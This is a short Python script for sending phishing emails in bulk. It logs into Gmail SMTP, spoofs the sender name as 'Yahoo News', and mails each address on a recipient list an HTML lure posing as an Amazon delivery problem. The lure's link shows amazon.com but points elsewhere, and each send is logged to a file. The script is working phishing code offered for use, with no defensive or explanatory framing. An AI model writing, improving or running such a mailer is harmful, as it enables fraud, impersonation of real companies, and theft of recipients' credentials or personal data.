import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json

from datetime import datetime

sender_email = "imperialy1337@gmail.com"
app_password = ""

with open('password.txt', 'r') as file:
    app_password = file.read()

subject = "Fraud Alert"
#message = "You've been hacked! return to <a href='http://www.example.com'>https://google.com/</a>"
message = '''
Your Amazon package arrived at the warehouse but could not be delivered due to incomplete address information. 
Please confirm your address in the link.
<a href='http://www.example.com'>https://amazon.com/</a>

Amazon team wishes you a wonderful day!
'''
spoofed_user = "Yahoo News"

def send_phishing_email(recipient):

    msg = MIMEMultipart()
    msg['From'] = spoofed_user
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'html'))

    data = {
        "time": "",
        "email": recipient,
        "status": ""
    }
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, app_password)
        server.sendmail(sender_email, recipient, msg.as_string())

        data["status"] = "SENT"
    except Exception as error:
        data["status"] = "ERROR"
    finally:
        data["time"] = datetime.now().strftime("%H:%M:%S")
        json_encoded = json.dumps(data)
        with open("logs.txt","a") as file:
            file.write(json_encoded + "\n")
        server.quit()

file_path = 'email_list'
try:
    with open(file_path, 'r') as file:
        for line in file:
            recipient = line.strip()
            send_phishing_email(recipient)

except FileNotFoundError:
    print(f"File not found: {file_path}")
except Exception as e:
    print(f"An error occurred: {str(e)}")